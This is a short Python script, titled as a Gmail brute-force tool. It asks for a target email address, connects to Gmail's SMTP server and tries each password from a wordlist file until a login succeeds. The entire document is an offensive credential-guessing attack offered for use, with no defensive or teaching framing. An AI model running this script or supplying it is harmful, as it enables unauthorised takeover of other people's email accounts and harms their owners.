# GMAIL BRUTE FORE TOOL IN PYTHON
# AUTHOR @devprecious


import smtplib

# Accept email to attack
email = input('ENTER EMAIL TO BRUTE FORCE: ')

# Connect to GMAIL SMTP
server = smtplib.SMTP('smtp.gmail.com', 587)
server.ehlo()
server.starttls()

# BRUTE FORCING
with open("passwords.txt", "r") as passwords:
    for password in passwords:
        try:
            server.login(email, password)
            print(f"Login successful with password: {password}")
            break  # Stop after successful login
        except smtplib.SMTPAuthenticationError:
            print(f"Login failed with password: {password}")
        except Exception as e:
            print(f"An error occurred: {e}")

server.quit()
